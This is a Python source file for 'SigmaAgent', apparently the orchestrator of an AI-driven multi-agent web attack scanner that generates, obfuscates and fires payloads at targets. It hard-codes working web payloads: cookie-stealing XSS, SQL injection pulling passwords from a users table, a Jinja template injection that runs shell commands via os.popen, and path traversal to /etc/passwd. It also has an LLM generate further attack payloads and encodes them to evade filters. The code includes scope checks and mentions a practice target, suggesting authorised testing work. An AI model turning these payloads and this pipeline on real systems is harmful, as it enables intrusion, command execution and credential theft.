import asyncio
import base64
import logging
import time
import urllib.parse
from datetime import datetime

from backend.agents._shared import (
    ControlSignalMixin,
    ScanContextRecorderMixin,
    SessionLifecycleMixin,
    SkillRecallMixin,
)
from backend.ai.cortex import get_cortex_engine
from backend.api.socket_manager import publish_request_event
from backend.core.browser_agent import BrowserEnabledAgent
from backend.core.content_boundary import content_boundary
from backend.core.hive import EventType, HiveEvent
from backend.core.protocol import AgentID, JobPacket, ModuleConfig, TaskPriority, TaskTarget
from backend.core.proxy import network_interceptor
from backend.core.unified_knowledge_graph import graph_engine

logger = logging.getLogger("AgentSigma")

# Import Arsenals
from backend.modules.logic.chronomancer import Chronomancer
from backend.modules.logic.doppelganger import Doppelganger
from backend.modules.logic.escalator import TheEscalator
from backend.modules.logic.skipper import TheSkipper
from backend.modules.logic.tycoon import TheTycoon
from backend.modules.tech.auth_bypass import AuthBypassTester
from backend.modules.tech.command_injection import CommandInjectionProbe
from backend.modules.tech.jwt import JWTTokenCracker
from backend.modules.tech.sqli import SQLInjectionProbe


class SigmaAgent(
    SkillRecallMixin, SessionLifecycleMixin, ControlSignalMixin, ScanContextRecorderMixin, BrowserEnabledAgent
):
    """
    AGENT SIGMA: THE ORCHESTRATOR
    Role: Execution Pipeline & Generative Weaponssmith with Browser-Aware Payloads.
    Capabilities:
    - Hosts all 9 Arsenal Modules natively.
    - Resolves pure math payloads to network IO state arrays.
    - AI-Powered Context-Aware Payload Generation.
    - Browser-aware payload generation based on DOM structure
    - Form-specific payload targeting
    - Framework-specific exploits
    """

    def __init__(self, bus):
        super().__init__("agent_sigma", bus)

        # CORTEX AI Generator
        try:
            self.ai = get_cortex_engine()
        except Exception as e:
            logger.debug(f"[{self.name}] AI Engine initialization deferred: {e}")
            self.ai = None

        # Stage 10 Hardening: Persistent session for high-concurrency network tasks
        self._session = None
        # Governance: throttle flag from Zeta
        self._throttled = False

        # Hybrid Engine State Map
        self.hybrid_token = None

        self.arsenal = {
            "tech_sqli": SQLInjectionProbe(),
            "tech_jwt": JWTTokenCracker(),
            "tech_auth_bypass": AuthBypassTester(),
            "tech_cmdi": CommandInjectionProbe(),
            "logic_tycoon": TheTycoon(),
            "logic_doppelganger": Doppelganger(),
            "logic_skipper": TheSkipper(),
            "logic_chronomancer": Chronomancer(),
            "logic_escalator": TheEscalator(),
        }

        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
        ]

        # ── Sigma-exclusive tool dispatch (Architecture §5.2, §29.4) ──────────
        # Sigma owns 5 validation/fingerprint tools exclusively (nuclei, httpx,
        # dalfox, whatweb, wafw00f). These are registered in SIGMA_TOOLS and
        # are NEVER dispatched by Alpha. Sigma decides per vuln hypothesis
        # whether to use a built-in module, browser action, or governed CLI
        # tool. Mirrors the Hermes availability-aware dispatch.
        #
        # Technique → candidate Sigma-exclusive CLI validators, in preference
        # order. Only tools in SIGMA_TOOLS can be dispatched here.
        self._technique_tool_map = {
            "tech_sqli": [],  # custom in-process module preferred
            "tech_jwt": [],
            "tech_auth_bypass": [],
            "recon_nuclei": ["nuclei"],  # Sigma-exclusive
            "recon_httpx": ["httpx"],  # Sigma-exclusive
            "tech_xss": ["dalfox"],  # Sigma-exclusive
            "tech_cve": ["nuclei"],  # Sigma-exclusive
            "tech_fingerprint": ["httpx", "whatweb", "wafw00f"],  # all Sigma-exclusive
        }
        # Per-path reliability ledger (Architecture §29: "update tool
        # reliability"). Keyed by path id, e.g. "cli:nuclei", "module:tech_sqli".
        self._path_reliability: dict = {}
        # Short-TTL tool availability cache (Hermes check_fn TTL pattern) so
        # repeated dispatch decisions don't re-probe PATH/tool-root/Docker.
        self._tool_avail_cache: dict = {}
        self._tool_avail_ttl = 30.0

    async def setup(self):
        # Listen for requests to generate payloads (e.g. from Beta)
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_generation_request)
        # Sequence Hybrid Integration: DOM Token Extractor
        self.bus.subscribe(EventType.JOB_COMPLETED, self.handle_hybrid_result)
        # Governance: respond to Zeta's control signals (shared mixin).
        self.subscribe_control(self.bus)

    async def stop(self):
        """Gracefully release the persistent generative execution session to prevent socket exhaustion."""
        # SessionLifecycleMixin handles the close+null-out behaviour Sigma
        # used to inline; semantics are identical.
        await self._close_session()
        await super().stop()

    async def handle_hybrid_result(self, event: HiveEvent):
        """Consume PinchTab tokens harvested by AgentDelta."""
        if event.source == "agent_delta" and isinstance(event.payload, dict):
            token = event.payload.get("data", {}).get("dom_token")
            if token:
                self.hybrid_token = token
                logger.debug(
                    f"[{self.name}] [HYBRID FUSION] Assimilated live DOM token: {token[:10]}... Incoming attack sequences updated."
                )

    # NOTE: handle_control_signal is inherited from ControlSignalMixin —
    # behaviour matches the original inline handler exactly (THROTTLE /
    # STEALTH_MODE -> _throttled=True, RESUME -> _throttled=False).

    async def _fetch(self, target: TaskTarget, scan_id: str = None) -> tuple[TaskTarget, str]:
        try:
            kwargs = {}
            # Build outbound headers from a COPY of target.headers so the
            # seeder's auth Cookie / Authorization survive across vectors and
            # per-payload mutations don't bleed back into the shared TaskTarget
            # (which is the same Pydantic instance for every payload Sigma
            # sends per packet).
            request_headers = dict(target.headers or {})
            content_type = request_headers.get("Content-Type") or request_headers.get("content-type") or ""
            if target.payload and target.method.upper() in ["POST", "PUT", "PATCH"]:
                if "application/x-www-form-urlencoded" in content_type:
                    kwargs["data"] = target.payload
                else:
                    kwargs["json"] = target.payload

            # Stage 10 Optimization: Reuse persistent session to prevent port
            # exhaustion. ``_get_session`` (SessionLifecycleMixin) lazily
            # creates one with the same 10s timeout we used inline before.
            session = await self._get_session()

            # HYBRID FUSION: Inject DOM Scraped Token into Live Fetch Header
            # ONLY when no Authorization is already provided by the seeder, and
            # only on the local copy so we don't clobber the upstream packet.
            if self.hybrid_token and "Authorization" not in request_headers and "authorization" not in request_headers:
                request_headers["Authorization"] = f"Bearer {self.hybrid_token}"

            response = await network_interceptor.fetch(
                target.method,
                target.url,
                session=session,
                headers=request_headers,
                timeout=10,
                **kwargs,
            )
            text = response.body[: 5 * 1024 * 1024]
            latency = response.elapsed_ms

            # [V7] Publish real-time telemetry for Sigma interactions
            await publish_request_event(
                {
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "method": target.method,
                    "endpoint": target.url[-40:] if len(target.url) > 40 else target.url,
                    "payload": str(target.payload)[:25],
                    "status": response.status,
                    "latency": latency,
                    "agent": "sigma_orchestrator",
                    "result": "OK" if response.status < 400 else "ERROR",
                },
                scan_id=scan_id,
            )

            safe_text = content_boundary.wrap_http_response(response.status, response.headers, text, response.url)
            return target, safe_text
        except Exception as e:
            logger.debug(f"[{self.name}] [FETCH ERROR] {target.url}: {e}")
            return target, ""

    def _tool_available(self, tool: str) -> bool:
        """Availability-aware check for a Sigma-exclusive CLI tool.

        Sigma owns 5 tools exclusively (nuclei, httpx, dalfox, whatweb, wafw00f)
        as defined in SIGMA_TOOLS. This method checks install state via the
        unified registry (check_tool_availability resolves from ALL_TOOLS).
        Results are TTL-cached so repeated dispatch decisions are cheap."""
        now = time.time()
        cached = self._tool_avail_cache.get(tool)
        if cached and (now - cached[0]) < self._tool_avail_ttl:
            return cached[1]
        available = False
        try:
            from backend.tools.recon.registry import SIGMA_TOOLS, check_tool_availability

            # Only allow Sigma to dispatch tools it exclusively owns.
            if tool not in SIGMA_TOOLS:
                logger.debug(f"[{self.name}] Tool '{tool}' is not in SIGMA_TOOLS, rejecting.")
                self._tool_avail_cache[tool] = (now, False)
                return False
            available = bool(check_tool_availability(tool).get("installed"))
        except Exception as e:
            logger.debug(f"[{self.name}] Tool availability check failed for {tool}: {e}")
            available = False
        self._tool_avail_cache[tool] = (now, available)
        return available

    def _path_reliability_score(self, path_id: str) -> float:
        """Prior reliability for a path id (e.g. "cli:nuclei", "module:tech_sqli").
        Architecture §29 self-improvement: "update tool reliability". Starts
        neutral (0.5) and is nudged by observed outcomes via _record_path_outcome."""
        stats = self._path_reliability.get(path_id)
        if not stats or stats.get("runs", 0) <= 0:
            return 0.5
        return stats["successes"] / stats["runs"]

    def _record_path_outcome(self, path_id: str, success: bool) -> None:
        """Record a validation-path outcome so future dispatch favours paths
        that have historically worked on this engagement."""
        stats = self._path_reliability.setdefault(path_id, {"runs": 0, "successes": 0})
        stats["runs"] += 1
        if success:
            stats["successes"] += 1

    async def _select_validation_path(self, module_id: str, packet, scan_id: str) -> dict:
        """Decide the RIGHT controlled validation path per vuln hypothesis:
        built-in module vs browser action vs governed CLI tool (Architecture
        §5.2 technique↔tooling bridge; §29.4 Sigma = tool/technique commander).

        Adopts the Hermes availability-aware dispatch (tools/registry): a CLI
        path is only chosen when the tool is actually runnable AND the target is
        in scope AND its prior reliability beats the in-process module. Skill
        recommendations (§29: "Sigma receives technique-selection skills") and
        graph reliability bias the decision."""
        recs = []
        try:
            from backend.core.skill_library import skill_library

            vuln_class = module_id.replace("tech_", "").replace("logic_", "")
            recs = skill_library.get_recommendations(target_url=packet.target.url, vuln_class=vuln_class, limit=5)
        except Exception as e:
            logger.debug(f"[{self.name}] Skill library recall failed: {e}")
            recs = []

        url = packet.target.url

        # 1. Candidate CLI validators for this technique, filtered by REAL
        #    availability (Hermes: only surface tools whose check_fn passes).
        candidates = self._technique_tool_map.get(module_id, [])
        available_tools = [t for t in candidates if self._tool_available(t)]

        # 2. Scope is law (Architecture §10): a CLI validation touches the
        #    network, so it must be in scope before it is even a candidate.
        in_scope = True
        try:
            from backend.core.scope import scope_guard

            in_scope = scope_guard.allows(url)
        except Exception as e:
            logger.debug(f"[{self.name}] Scope check failed, defaulting to in-scope: {e}")
            in_scope = True

        # 3. Skill recommendations can steer toward tool orchestration when a
        #    matching high-confidence skill is recalled.
        skill_prefers_tool = any(
            r.get("score", 0) >= 0.6 and "tool" in (r.get("skill_type", "") or "").lower() for r in recs
        )

        if available_tools and in_scope:
            # 4. Reliability-aware choice (Hermes prefers the path most likely
            #    to succeed): pick the most reliable available tool and only
            #    take the CLI path if it beats the in-process module — unless a
            #    skill explicitly recommends tooling.
            best_tool = max(available_tools, key=lambda t: self._path_reliability_score(f"cli:{t}"))
            cli_score = self._path_reliability_score(f"cli:{best_tool}")
            module_score = self._path_reliability_score(f"module:{module_id}")
            if skill_prefers_tool or cli_score >= module_score:
                return {
                    "path": "cli_tool",
                    "tool": best_tool,
                    "skills": recs,
                    "reason": "skill" if skill_prefers_tool else "reliability",
                    "cli_score": round(cli_score, 3),
                    "module_score": round(module_score, 3),
                }

        # 5. In-process module is the default controlled validation path when it
        #    exists; otherwise fall back to a browser action (DOM/SPA targets).
        if module_id in self.arsenal:
            return {
                "path": "module",
                "skills": recs,
                "unavailable_tools": [t for t in candidates if t not in available_tools],
            }
        return {"path": "browser", "skills": recs}

    async def _run_cli_validation(self, vp: dict, packet, scan_id: str) -> None:
        """Run a CLI validation tool via the governed Terminal Engine
        (Architecture §5.2, §8, §29.11 item 4: Sigma access to governed terminal
        execution). argv-only, scope-checked, budgeted, audited."""
        from pathlib import Path

        from backend.core.iteration_budget import budget_config
        from backend.core.terminal_engine import terminal_engine

        tool = vp.get("tool")
        url = packet.target.url
        out = Path("data") / "scans" / scan_id / "sigma" / f"{tool}.out"
        argv_map = {
            "nuclei": ["nuclei", "-u", url, "-severity", "critical,high,medium", "-jsonl", "-silent"],
            "httpx": ["httpx", "-u", url, "-tech-detect", "-status-code", "-json", "-silent"],
            "dalfox": ["dalfox", "url", url, "--format", "json", "--silence"],
            "whatweb": ["whatweb", "--log-json=-", url],
            "wafw00f": ["wafw00f", url],
        }
        argv = argv_map.get(tool)
        if not argv:
            return
        budget = budget_config.make("commander", label=f"sigma:{tool}")
        result = await terminal_engine.run(
            argv,
            scan_id=scan_id,
            agent=self.name,
            output_path=out,
            timeout_seconds=180,
            budget=budget,
            parser_hint="jsonl",
        )
        # Reliability feedback (Architecture §29: "update tool reliability"):
        # the governed result's status feeds the next dispatch decision.
        self._record_path_outcome(f"cli:{tool}", success=(result.status == "finished"))
        await self.bus.publish(
            HiveEvent(
                type=EventType.LIVE_ATTACK,
                source=self.name,
                scan_id=scan_id,
                payload={
                    "url": url,
                    "arsenal": f"Terminal:{tool}",
                    "action": "Governed CLI validation",
                    "payload": result.status,
                },
            )
        )

    async def handle_generation_request(self, event: HiveEvent):
        packet_dict = event.payload
        # ScanContext: record event for transcript causality (shared mixin).
        self.record(event)
        try:
            packet = JobPacket(**packet_dict)
        except Exception as e:
            logger.debug(f"[{self.name}] Job packet parse failed: {e}")
            return

        if packet.config.agent_id != AgentID.SIGMA:
            return

        module_id = packet.config.module_id

        # SIGMA AS TECHNIQUE↔TOOLING BRIDGE (Architecture §5.2, §29.4):
        # before executing, consult skill recommendations and decide whether a
        # built-in module, browser action, or CLI tool is the right controlled
        # validation path for this target.
        validation_path = {"path": "module"}
        try:
            validation_path = await self._select_validation_path(module_id, packet, event.scan_id)
            logger.info(
                f"[{self.name}] [DISPATCH] '{module_id}' -> {validation_path.get('path')}"
                f"{(' (' + str(validation_path.get('tool')) + ')') if validation_path.get('tool') else ''}"
                f"{(' reason=' + validation_path.get('reason')) if validation_path.get('reason') else ''}"
            )
            if validation_path.get("path") == "cli_tool":
                await self._run_cli_validation(validation_path, packet, event.scan_id)
        except Exception as _se:
            logger.debug(f"[{self.name}] technique-bridge skipped: {_se}")

        if module_id in self.arsenal:
            logger.info(f"[{self.name}] [PLAN] Orchestrating '{module_id}' execution on {packet.target.url}")

            # STAGE 11: HYBRID GRAPH ENGINE PREDICTION
            predictions = graph_engine.predict_next(module_id, packet.target.url)
            if predictions:
                top_pred = predictions[0]
                logger.debug(
                    f"[{self.name}] [GRAPH AI] Intelligence predicts {top_pred['suggestion']} is {top_pred['confidence']}% likely next."
                )
                # We could mutate the packet here to chain modules, but for safety we just log the intelligence advantage for now.

            module = self.arsenal[module_id]

            # 1. PLAN: Generate target payloads
            targets = await module.generate_payloads(packet)

            # PHASE 2: ROAST (STRICT REJECTION LAYER)
            # Filter targets to ensure they map to PinchTab's semantic reality
            # if Hybrid DOM data exists.
            if packet.config.params and "semantic_state" in packet.config.params:
                semantic = packet.config.params["semantic_state"]
                mapped_targets = [t.get("target") for t in semantic.get("actions_mapped", [])]
                if mapped_targets:
                    valid_targets = []
                    for t in targets:
                        # If a payload targets an unobserved parameter, we ROAST it (Reject)
                        if any(m_target in str(t.payload) for m_target in mapped_targets) or module_id.startswith(
                            "logic"
                        ):
                            valid_targets.append(t)
                    targets = valid_targets
                    logger.debug(
                        f"[{self.name}] [ROAST] Filtered hallucinated vectors. Clean vectors remaining: {len(targets)}"
                    )

            if not targets:
                await self.bus.publish(
                    HiveEvent(
                        type=EventType.JOB_COMPLETED,
                        source=self.name,
                        payload={"job_id": packet.id, "status": "SUCCESS"},
                    )
                )
                return

            # BROADCAST LIVE ATTACK INTENT
            await self.bus.publish(
                HiveEvent(
                    type=EventType.LIVE_ATTACK,
                    source=self.name,
                    scan_id=event.scan_id,
                    payload={
                        "url": packet.target.url,
                        "arsenal": module_id,
                        "action": "Orchestrating multi-vector assault",
                        "payload_count": len(targets),
                    },
                )
            )

            # 2. EXECUTE: Concurrently fetch
            # Cyber-Organism Protocol: Native gathered orchestration
            logger.info(f"[{self.name}] [EXECUTE] Dispatching {len(targets)} asynchronous network tasks...")

            # PERFORMANCE CONTROL: Concurrency & Rate Limiting (Phase 2)
            rps = packet.config.params.get("rps", 100)

            # Governance throttle (Architecture §5.2/§29.4): when Zeta has told
            # us to slow down, halve the requested RPS — never sleep blindly,
            # just pace the dispatch.
            if self._throttled:
                rps = max(1, rps // 2)
                logger.warning(f"[{self.name}] [THROTTLE] Reducing RPS to {rps} under governance signal.")

            # 1/rps = delay between starts to maintain ceiling
            rate_limit_delay = 1.0 / rps if rps > 0 else 0

            # RATE LIMITING FIX: Use a semaphore + inter-request delay to
            # enforce RPS ceiling. Previous code used asyncio.gather with a
            # post-fetch sleep, which fired ALL requests simultaneously.
            semaphore = asyncio.Semaphore(max(1, rps))  # cap inflight

            async def lane_fetch(t, idx: int):
                # Stagger starts: first request fires immediately, subsequent
                # ones are paced at rate_limit_delay apart.
                if idx > 0 and rate_limit_delay > 0:
                    await asyncio.sleep(min(idx * rate_limit_delay, 5.0))
                async with semaphore:
                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.LIVE_ATTACK,
                            source=self.name,
                            scan_id=event.scan_id,
                            payload={
                                "url": t.url,
                                "arsenal": module_id,
                                "action": "Injecting mission-governed payload",
                                "payload": str(t.payload)[:100] + ("..." if len(str(t.payload)) > 100 else ""),
                            },
                        )
                    )
                    return await self._fetch(t, scan_id=event.scan_id)

            results = await asyncio.gather(*[lane_fetch(t, i) for i, t in enumerate(targets)])

            # 3. OBSERVE: Analyze interactions
            logger.debug(f"[{self.name}] [OBSERVE] Applying pure module evaluation...")
            vulns = await module.analyze_responses(list(results), packet)

            # Reliability feedback for the in-process module path so future
            # dispatch decisions (_select_validation_path) learn which technique
            # path actually produces findings (Architecture §29).
            self._record_path_outcome(f"module:{module_id}", success=bool(vulns))

            # REAL-TIME SYNC: Publish VULN_CONFIRMED if found
            if vulns:
                for v in vulns:
                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.VULN_CONFIRMED,
                            source=self.name,
                            scan_id=event.scan_id,
                            payload={
                                "type": module_id.upper(),
                                "url": packet.target.url,
                                "severity": getattr(v, "severity", "HIGH"),
                                "payload": str(packet.target.payload),
                                "evidence": getattr(v, "evidence", "None"),
                            },
                        )
                    )

            await self.bus.publish(
                HiveEvent(
                    type=EventType.JOB_COMPLETED,
                    source=self.name,
                    scan_id=event.scan_id,
                    payload={
                        "job_id": packet.id,
                        "status": "VULN_FOUND" if vulns else "SUCCESS",
                        "vulnerabilities": [v.model_dump() for v in vulns],
                    },
                )
            )
            return

        # 4. IF SIGMA_BYPASS (Weaponssmith generation)
        logger.info(f"[{self.name}] Forging evasion payloads for {packet.target.url}...")

        # 1. CONTEXT AWARE GENERATION
        generated_payloads = []

        # Try AI First (Cortex NVIDIA/Ollama) with Master Prompt Guardrails
        if self.ai and self.ai.enabled:
            logger.debug(f"[{self.name}] >> CORTEX AI: Generating context-aware payloads via NVIDIA/Ollama...")

            # INJECT: Xytherion Master Prompt (DEFINE -> ROAST -> REFINE)
            master_guard = "MASTER RULE: You must NOT hallucinate endpoints. Only generate payloads valid for the observed API behavior."
            if packet.config.params and "semantic_state" in packet.config.params:
                master_guard += f" OBSERVED DOM ACTIONS: {packet.config.params['semantic_state']['actions_mapped']}."

            try:
                ai_payloads = await self.ai.generate_attack_payloads(
                    target_url=packet.target.url,
                    attack_types=["XSS", "SQLi", "SSTI", "Path Traversal"],
                    contextual_notes=master_guard,
                    scan_ctx=getattr(self.bus, "scan_contexts", {}).get(event.scan_id),
                )
                if ai_payloads:
                    generated_payloads.extend(ai_payloads)
                    logger.debug(f"[{self.name}] >> CORTEX AI: Generated {len(ai_payloads)} ROAST-validated payloads.")
            except Exception as e:
                logger.warning(f"[{self.name}] CORTEX AI Failure. Falling back to templates: {e}")

        # Fallback to Templates if AI produced nothing
        if not generated_payloads:
            context = {"context_var": "XSS_BY_SIGMA", "context_table": "admin_creds", "cmd": "id"}
            for template in self.payload_templates:
                raw_payload = template.format(**context)
                generated_payloads.append(raw_payload)

        # 2. OBFUSCATION ENGINE (Applies to all)
        final_payloads = []
        for raw in generated_payloads:
            final_payloads.append(raw)
            # Add variants
            final_payloads.append(self.obfuscate(raw, "base64"))
            final_payloads.append(self.obfuscate(raw, "hex"))
            final_payloads.append(self.obfuscate(raw, "url"))

        # Publish Results (The "Weapon Shipment")
        await self.bus.publish(
            HiveEvent(
                type=EventType.JOB_COMPLETED,
                source=self.name,
                scan_id=event.scan_id,
                payload={
                    "job_id": packet.id,
                    "status": "SUCCESS",
                    "target_url": packet.target.url,
                    # Pass the seeder's auth context through to Beta so the
                    # weapon shipment lands on an authenticated session, not the
                    # DVWA login redirect.
                    "target_headers": dict(packet.target.headers or {}),
                    "data": {"generated_payloads": final_payloads},
                },
            )
        )
        logger.info(f"[{self.name}] Forged {len(final_payloads)} SOTA payloads.")

        # BUG 6 FIX: Explicitly hand off payloads to Beta for execution
        beta_handoff = JobPacket(
            priority=TaskPriority.HIGH,
            target=TaskTarget(url=packet.target.url, headers=dict(packet.target.headers or {})),
            config=ModuleConfig(
                module_id="sigma_payload_handoff", agent_id=AgentID.BETA, params={"payloads": final_payloads}
            ),
        )
        await self.bus.publish(
            HiveEvent(
                type=EventType.JOB_ASSIGNED, source=self.name, scan_id=event.scan_id, payload=beta_handoff.model_dump()
            )
        )

    def obfuscate(self, payload: str, method: str) -> str:
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        elif method == "url":
            return urllib.parse.quote(payload)
        return payload

    # ============ BROWSER-AWARE PAYLOAD GENERATION (Phase 2) ============

    async def _generate_browser_aware_payloads(self, url: str, scan_id: str) -> list:
        """Generate payloads based on actual DOM structure and forms."""
        try:
            logger.debug(f"[{self.name}] Analyzing DOM structure for browser-aware payloads...")

            # Analyze DOM structure
            dom_structure = await self._analyze_dom_structure(url)

            if not dom_structure:
                return []

            payloads = []

            # Generate form-specific payloads
            for form in dom_structure.get("forms", []):
                form_payloads = await self._generate_form_specific_payloads(form, url)
                payloads.extend(form_payloads)

            # Generate framework-specific payloads
            framework = dom_structure.get("framework")
            if framework:
                framework_payloads = self._generate_framework_payloads(framework, url)
                payloads.extend(framework_payloads)

            logger.debug(f"[{self.name}] Generated {len(payloads)} browser-aware payloads")

            return payloads

        except Exception as e:
            logger.warning(f"[{self.name}] Browser-aware payload generation failed: {e}")
            return []

    async def _analyze_dom_structure(self, url: str) -> dict:
        """Analyze DOM structure to understand forms, inputs, and framework."""
        try:
            logger.debug(f"[{self.name}] Analyzing DOM structure for: {url}")

            # Navigate to page using browser
            nav_result = await self.browser.navigate(url, stealth=False)

            if not nav_result.get("success"):
                logger.warning(f"[{self.name}] Navigation failed for DOM analysis")
                return {}

            # Detect framework
            framework = await self.browser.detect_framework(url)

            dom_details = await self.browser.analyze_dom(url)
            dom_structure = {
                "framework": framework,
                "forms": dom_details.get("forms", []) if isinstance(dom_details, dict) else [],
                "inputs": dom_details.get("inputs", []) if isinstance(dom_details, dict) else [],
                "buttons": dom_details.get("buttons", []) if isinstance(dom_details, dict) else [],
                "scripts": [],
                "url": url,
            }

            logger.debug(f"[{self.name}] DOM analysis complete. Framework: {framework}")

            return dom_structure

        except Exception as e:
            logger.warning(f"[{self.name}] DOM analysis failed: {e}")
            return {}

    async def _generate_form_specific_payloads(self, form: dict, url: str) -> list:
        """Generate payloads targeted at specific form fields."""
        payloads = []

        try:
            form.get("action", url)
            form.get("method", "POST")

            for input_field in form.get("inputs", []):
                field_name = input_field.get("name", "")
                field_type = input_field.get("type", "text")

                # Generate payloads based on field type
                if field_type == "email":
                    payloads.extend(
                        [
                            f"{field_name}=test@example.com<script>alert(1)</script>",
                            f"{field_name}=test@example.com'><img src=x onerror=alert(1)>",
                            f"{field_name}=admin@localhost",
                        ]
                    )
                elif field_type == "password":
                    payloads.extend(
                        [
                            f"{field_name}=' OR '1'='1",
                            f"{field_name}=admin' --",
                            f"{field_name}=<script>alert(document.cookie)</script>",
                        ]
                    )
                elif field_type == "number":
                    payloads.extend(
                        [
                            f"{field_name}=-1",
                            f"{field_name}=999999999",
                            f"{field_name}=0.0001",
                            f"{field_name}=1' OR '1'='1",
                        ]
                    )
                elif field_type == "search":
                    payloads.extend(
                        [
                            f"{field_name}=<script>alert(1)</script>",
                            f"{field_name}={{{{7*7}}}}",
                            f"{field_name}=${{7*7}}",
                        ]
                    )
                else:  # text, textarea, etc.
                    payloads.extend(
                        [
                            f"{field_name}=<script>alert(1)</script>",
                            f"{field_name}=' OR 1=1--",
                            f"{field_name}=../../../etc/passwd",
                            f"{field_name}={{{{config}}}}",
                        ]
                    )

        except Exception as e:
            logger.warning(f"[{self.name}] Form-specific payload generation failed: {e}")

        return payloads

    def _generate_framework_payloads(self, framework: str, url: str) -> list:
        """Generate framework-specific exploit payloads."""
        payloads = []

        if framework == "react":
            payloads.extend(
                [
                    "?search=javascript:alert(1)",
                    "?redirect=javascript:alert(document.domain)",
                    "?dangerouslySetInnerHTML=<img src=x onerror=alert(1)>",
                    "?__html=<script>alert(1)</script>",
                ]
            )
        elif framework == "vue":
            payloads.extend(
                [
                    "?v-html=<img src=x onerror=alert(1)>",
                    "?{{constructor.constructor('alert(1)')()}}",
                    "?search={{7*7}}",
                ]
            )
        elif framework == "angular":
            payloads.extend(
                [
                    "?search={{constructor.constructor('alert(1)')()}}",
                    "?{{$on.constructor('alert(1)')()}}",
                    "?search={{7*7}}",
                ]
            )

        return payloads

    async def _test_payload_browser(self, url: str, payload: str, scan_id: str) -> dict:
        """Pre-test payload in browser before mass deployment."""
        try:
            logger.debug(f"[{self.name}] Pre-testing payload in browser: {payload[:50]}...")

            # Test payload using browser
            result = await self.browser.test_payload(url, payload)

            if result.get("triggered"):
                logger.debug(f"[{self.name}] [PRE-TEST SUCCESS] Payload effective: {payload[:50]}")

                # Capture evidence
                await self.forensics.capture_screenshot(
                    scan_id=scan_id, context=result.get("context"), engine="openclaw", label="payload_pretest"
                )

                return {"effective": True, "payload": payload, "evidence": "Payload triggered in browser pre-test"}

            return {"effective": False, "payload": payload}

        except Exception as e:
            logger.warning(f"[{self.name}] Payload pre-test failed: {e}")
            return {"effective": False, "payload": payload, "error": str(e)}
